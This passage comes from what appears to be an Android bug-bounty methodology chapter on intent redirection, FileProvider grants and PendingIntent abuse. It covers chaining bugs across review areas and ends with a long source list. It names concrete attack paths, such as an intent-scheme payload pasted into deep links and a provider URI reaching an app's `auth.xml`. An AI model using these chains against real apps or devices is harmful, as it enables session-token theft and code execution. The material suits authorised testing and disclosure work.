| Redirection into a component that immediately re-checks the session and bounces to login | The auth control held; you crossed the export boundary, not the auth boundary | Find the component that does **not** re-check — that is question 4 of the pre-severity gate (D08-065) |
| A persistable grant you obtained but never used after a reboot | The claim "survives reboot" is exactly the kind of unverified half-link that gets a Critical downgraded | Reboot the device and read the URI again, with `dumpsys activity permissions` before and after (D08-012) |
| `EXTRA_REFERRER` present in the code | Analytics reads it constantly and harmlessly | It feeds an authorisation decision (D08-060) |

## Cross-surface joins

- **D08 × D07 — the paths XML and the forwarder.** Nobody reads `res/xml/file_paths.xml` and
  `startActivity(getIntent().getParcelableExtra(...))` in the same sitting. The XML decides what a grant
  *reaches*; the forwarder decides *who gets one*. Separately they are a configuration note and a
  "component forwards an intent". Joined, they are
  `content://com.target.app.fileprovider/root/data/data/com.target.app/shared_prefs/auth.xml` read by a
  zero-permission app. Do the D08-006 census **before** you build any PoC — it picks your target URI for
  you, and it is why `exported="false"` on a provider is never a ruled-out basis on its own.
- **D08 × D10 — the forwarder and the session-bearing WebView.** The WebView reviewer enumerates bridges
  and origins; the IPC reviewer enumerates exported components. Neither asks which **non-exported**
  activity hosts a WebView that already carries the user's cookies. That activity is the highest-value
  redirect target in most apps: the redirect supplies the URL, the WebView supplies the session, and the
  finding converts from an unrated intent exposure into token theft. Pick the redirect target by sink
  quality, not by the word "Admin" in its class name.
- **D08 × D09 — the deep link is what changes the attacker model.** The same `parseUri` sink is AM-03 when
  it is reached from an extra and AM-02 when it is reached from a link in a browser or a message. The deep
  link reviewer tests for open redirect and XSS in the `url` parameter and never pastes
  `intent:#Intent;component=...;end` into it. That one payload moves severity by a whole band because it
  removes the "attacker must already have an app installed" objection (D08-022, -024, -026).
- **D08 × D24/D28 — the notification drawer is the PendingIntent acquisition layer.** The PendingIntent
  reviewer reads the builder; the notification reviewer reads the content. The join is a
  `NotificationListenerService` that harvests `contentIntent`/`actions[i].actionIntent` and re-sends them:
  it converts "the app creates a mutable PendingIntent" from a code observation into a confused deputy with
  a working acquisition path, and it is the documented vector on Google's own page (D08-040, -041).
- **D08 × D17 — the write flag and the loader.** `FLAG_GRANT_WRITE_URI_PERMISSION` is usually reported as
  "write access to app data", which most programmes rate Medium. Enumerate `DexClassLoader`,
  `PathClassLoader`, `System.load`, `createPackageContext` and the plugin directories **first**, choose the
  write destination to match, and the same primitive is the top-paying category on the programme. This is
  the Oversecured Google-app chain shape: redirection → provider write → code load.
- **D08 × D03 — the permission the victim holds is the permission you inherit.** The manifest reviewer
  lists `READ_CONTACTS`, `READ_SMS`, `READ_CALL_LOG` and moves on; the redirection reviewer aims at the
  app's own providers. Aim instead at the **system** provider the victim has permission for
  (`content://com.android.contacts/data`) and the echo or the grant re-delegates a dangerous permission you
  never requested (D08-034). The manifest's permission list is a menu of what the confused deputy can fetch.
- **D08 × D05/D13 — the exported receiver on the OTP screen.** D05 tests exported receivers for injection;
  D13 tests OTP flows for brute force. Neither tests the GMS SMS User Consent receiver as an
  *arbitrary-Intent-launch gadget* that exists **only while the OTP screen is up** — which is also the
  moment the app's private storage holds the freshest session material (D08-061). The BAL precondition on
  API 34+ makes it "captures on the next login", not "unconditional"; say that yourself before the triager
  does.
- **D08 × D15 — where the redirect lands is often an older API surface.** An internal route reached through
  a forwarder or an internal WebView frequently calls a backend version the current web client no longer
  uses, with weaker authorisation and more field exposure. Diff the two **behaviourally**, not by response
  shape: a version difference alone is informational; the weakened control is the finding. Take the
  redirect's destination URL off-device and replay it against the current API version to see which checks
  are missing.
- **D08 × D23 — replay and idempotency.** The payments reviewer tests the checkout flow in the UI; the
  PendingIntent reviewer greps `FLAG_ONE_SHOT`. Joined: a payment-confirmation PendingIntent without
  `FLAG_ONE_SHOT` whose backend has no idempotency key produces N charges from one user tap, and the
  `filterEquals()` collision (D08-043) produces the charge against the *wrong* order (D08-042, -050).
- **D08 × D06 — PendingIntents handed out over AIDL.** A bound service's `Bundle` return value is reviewed
  for the data it carries and never for the *capabilities* it carries. An `IBinder` or a `PendingIntent`
  under an unexpected key is a live capability crossing a trust boundary in a container everyone treats as
  a dictionary (D08-030, -047).
- **D08 × D11 — reachability is what converts storage into a finding.** An unencrypted token in
  `shared_prefs` is P5 by VRT and explicitly out of scope at several programmes. The grant or the echo is
  what makes it a P1 read. File the **access** as the bug and the storage as the payload, never the other
  way round.
- **D08 × D02 — the vulnerable component is often not the client's.** The merged manifest contains the
  activities that dependencies contributed, and the client's own SAST never looked at them. Run the
  redirection sweep scoped to non-app packages (D08-005): the EngageLab class was an exported SDK activity
  calling `parseUri(..., URI_ALLOW_UNSAFE)` in 50M+ installs, and the fix was a dependency bump — which
  also changes who owns the report.

## Sources

- **Android platform documentation** — `privacy-and-security/risks/intent-redirection` (the impact list,
  the `IntentSanitizer` builder, the four `FLAG_GRANT_*` flags to strip, the Android 16 by-default
  hardening and `removeLaunchSecurityProtection()`, and the "Common Mistakes to Avoid" list);
  `risks/pending-intent` (mutability, `fillIn()`, `FLAG_IMMUTABLE`, `FLAG_ONE_SHOT`, the replay section);
  `risks/sender-of-pending-intents` ("the creator does not always match the sender", and the
  `Binder.getCallingUid()` / `getSentFromUid()` alternatives); `risks/content-resolver`
  (`belongsToCurrentApplication()`, `isExported()`, `wasGrantedPermission()`);
  `guide/components/intents-filters#DetectUnsafeIntentLaunches`; `about/versions/12/behavior-changes-12`
  (mutability mandate, lint `UnspecifiedImmutableFlag`, notification trampolines,
  `NOTIFICATION_TRAMPOLINE_BLOCK`); `about/versions/14/behavior-changes-14` (mutable PendingIntent must
  specify package/component, compat change `BLOCK_MUTABLE_IMPLICIT_PENDING_INTENT` id `236704164L`,
  `FLAG_ALLOW_UNSAFE_IMPLICIT_INTENT`, implicit intents reach exported components only);
  `about/versions/15/behavior-changes-15` and `about/versions/15/features`
  (`setPendingIntentCreatorBackgroundActivityStartMode`, `ComponentCaller`,
  `Context.checkContentUriPermissionFull()`, `android:requireContentUriPermissionFromCaller`);
  `about/versions/16/behavior-changes-all` and `-16` (intent-redirection hardening, the reflection form of
  the opt-out, `android:intentMatchingFlags` with `enforceIntentFilter`/`none`/`allowNullAction`);
  `guide/components/activities/background-starts`; `develop/ui/views/appwidgets`
  (`setPendingIntentTemplate` + fill-in); `develop/ui/views/notifications/build-notification`; AOSP
  `PendingIntent.java` javadoc (the identity rule — `filterEquals()` plus `requestCode`, extras excluded;
  `FLAG_UPDATE_CURRENT` still applying under `FLAG_IMMUTABLE`; `FLAG_ONE_SHOT`) and `Intent.java`
  (`setSelector`, `URI_INTENT_SCHEME`, `URI_ANDROID_APP_SCHEME`, `URI_ALLOW_UNSAFE`).
- **OWASP MASTG / MASVS / MASWE** — MASTG-TEST-0381 (References to Insecure PendingIntent Creation),
  MASTG-TEST-0375 (Missing Validation of Data Returned from Implicit Intents), MASTG-TEST-0372,
  MASTG-TEST-0374, MASTG-TEST-0250, MASTG-TEST-0357, MASTG-TEST-0315, MASTG-TEST-0030 (deprecated, source
  of the Frida hook); MASTG-KNOW-0024 (Pending Intents), -0117 (`android:grantUriPermissions`), -0138 (URI
  schemes in Intent results), -0025; MASTG-BEST-0063, -0057; MASTG-TECH-0043; rules
  `mastg-android-pendingintent-mutable` (the flag-value list `0`, `134217728`, `33554432`, `0x08000000`,
  `0x02000000`) and `mastg-android-fileprovider-broad-scope`; MASWE-0032 (CWE-927, CWE-940), MASWE-0050
  (CWE-20, CWE-345), MASWE-0029; MASVS-PLATFORM-1, MASVS-CODE-4. Identifiers cross-checked against
  `data/mastg-android-tests.csv`, `-techniques.csv`, `-rules.csv`.
- **Bugcrowd VRT release 2026-07-08** (`data/bugcrowd-vrt-full.csv`, 581 entries) — in particular
  `broken_access_control.exposed_sensitive_android_intent` carrying `priority: null` with an all-zero CVSS
  v3 vector, which is why every item in this chapter is written to argue its own priority, and the P5
  pinning of the whole mobile branch.
- **Google Mobile VRP and Play policy** — "Intent redirections leading to launching non-exported
  application components" and "Vulnerabilities caused by unsafe usage of pending intents" in the
  *Additional vulnerability types in scope*; the Android & Google Devices "valid bypasses of Intent Redirect
  hardening" line; Google's own auditing tip on `startActivity` and `Intent::getExtras`; the Play App
  Security Improvement campaigns **Intent Redirection** (`faqs/answer/9267555`, started 2019-05-16),
  **Implicit PendingIntent** (`faqs/answer/10437428`, started 2022-02-22) and **Implicit Internal Intent**
  (2021-06-22); the "Cross-app scripting" class from Google's own PDF.
- **Oversecured** — "Android: Access to app protected components" (§§1–5: nested extras, grant flags,
  `setSelector`, the `intent://`/WebView vector, and the `Parcel.unmarshall` custom parser), "Gaining
  access to arbitrary Content Providers" (the four byte-returning vectors and the
  `setResult(-1, getIntent())` shape, plus the remediation line "developers should never redirect Intents
  in full"), "Android deep link vulnerabilities", "Why dynamic code loading could be dangerous for your
  apps: a Google example", "Discovering vendor-specific vulnerabilities in Android"
  (`SettingsHomepageActivity` at UID 1000), the Samsung "PendingIntent Hijacking" category, and the
  published base rate of **more than 80% of apps** for the nested-Intent forward.
- **Disclosed reports** — H1 #200427 (Slack, **Critical**, `extra_deep_link_intent` → `CallActivity`
  placing a real call), #2289836 (MercadoLibre, **High 8.6**, `SplashActivity` → ATO / arbitrary file read
  and deletion / partial code execution), #1095633 (VK, Critical), #951691, #272044 (Dropbox, $1000,
  non-exported provider access), #1161401 (Nextcloud, **Low 1.3**, $250 — the notification-listener
  PendingIntent, rated low precisely because of the listener precondition).
- **CVEs and vendor advisories seen in the corpus** — CVE-2020-0389 / A-156959408 (implicit base intent +
  mutable PendingIntent, cited by MASTG); CVE-2024-26131 (Element Android); CVE-2023-44121 (LG ThinQ
  exported receiver); CVE-2023-30728 (Samsung PackageInstallerCHN); CVE-2022-36837 (Samsung Email);
  CVE-2021-4438 (React Native SMS User Consent); CVE-2020-14116 (Xiaomi Mi Browser); CVE-2025-12080
  (Google Messages for Wear OS `ACTION_SENDTO`); CVE-2025-59489 (Unity runtime `-xrsdk-pre-init-library`);
  CVE-2021-0928 (ReparcelBug2 `OutputConfiguration` write/read mismatch), CVE-2022-20452 (LeakValue),
  CVE-2023-45777 (TheLastBundleMismatch — untyped `bundle.getParcelable(KEY_INTENT)`), CVE-2023-20963
  (WorkSource, exploited in the wild), CVE-2017-0806, CVE-2021-0748 (Bundle Fengshui / launchAnyWhere).
  The EngageLab EngageSDK `MTCommonActivity` / `n_intent_uri` / `URI_ALLOW_UNSAFE` class (Microsoft
  Security Blog 2026-04-09; vulnerable ≤ 4.5.4, fixed 5.2.1 on 2025-11-03; 50M+ installs) **had no CVE in
  the sources read — do not cite one**. EDB 38170 (Facebook for Android 1.8.1, `LoginActivity` →
  `FacebookWebViewActivity` → `webview.db` cookie theft).
- **MITRE ATT&CK Mobile** — T1626 Abuse Elevation Control Mechanism (detection DET0642), T1635 / T1635.001
  Steal Application Access Token / URI Hijacking, T1624.001 Broadcast Receivers, T1409 Stored Application
  Data, T1533 Data from Local System, T1517 Access Notifications; verified against
  `data/mitre-attack-mobile-android.csv`.
- **Tooling, read at source** — drozer (`app.activity.start`, `app.provider.info`'s
  `Grant Uri Permissions:` field, the verified flag map `GRANT_READ_URI_PERMISSION 0x1` /
  `GRANT_WRITE_URI_PERMISSION 0x2`, the `parcelable` extra type and the
  `android.intent.extra.INTENT` / `android.intent.extra.REFERRER` extras lists in `src/drozer/android.py`);
  Frida hooks on `android.app.Activity.startActivity`, `android.content.Intent.getParcelableExtra` and
  `android.app.PendingIntent.get*` (MASTG-TECH-0043); `semgrep` with the MASTG rule; QARK
  `implicit_intent_to_pending_intent.py`; mindedsecurity `MSTG-PLATFORM-4_1` and `MSTG-PLATFORM-4_2` (the
  bitmask tests `$D & 0x04000000` and `$D & 0x40000000`); `apkanalyzer manifest print` for the merged
  manifest; `am compat enable DETECT_UNSAFE_INTENT_LAUNCH` / `BLOCK_MUTABLE_IMPLICIT_PENDING_INTENT` /
  `NOTIFICATION_TRAMPOLINE_BLOCK`; `dumpsys activity intents|permissions|providers|activities` and
  `dumpsys notification --noredact`.
- **Community checklists and write-ups** — HackTricks (`intent-injection.md`,
  `android-applications-basics.md`, `android-checklist.md`) for the CWE-926 framing, the selector bypass,
  the two-API-level rule and `FLAG_DEBUG_LOG_RESOLUTION` (`0x8`); sec-88 "Intent Redirection Vulnerability"
  and its Ostorlab KB embed (`INTENT_REDIRECTION`, MASVS_CODE_4 / MSTG_PLATFORM_2 / M4 2024, rated High);
  valsamaras "Pending Intents: A Pentester's view"; tinopreter, Anas Eladly, dnelsaka and the OVAA
  `LoginActivity` → `WebViewActivity` chain; hackwithsingh sec-14 series; Indusface; Mobile Hacking Lab
  "Android Intent Security" step 4; the B3nac and saeidshirazi indexes.
- **The 4,467-star bug-hunting corpus** — marker discipline and the baseline check (D08-063), the
  body-diff and server-policy-vs-state rules (D08-063), the shell-loop ban and the multi-tool reproduction
  bar (D08-064), the pre-severity gate and retraction discipline (D08-065), the five-screenshot pattern,
  the PII mask/leave-visible split and chain-filing order (D08-066), and the shadow-API mobile-to-backend
  bridge (the D08 × D15 join).
- **Local senior-researcher corpus** — the confused-deputy framing ("you rarely attack a component
  directly"), the `setSelector(null)` fix-bypass rule, "prove the copy, not the open", the byte-returning
  gadget enumeration, the `EXTRA_CONSENT_INTENT` self-grant chain end to end with its BAL precondition, and
  the "two verified links plus one unproven link is a Medium" severity rule.
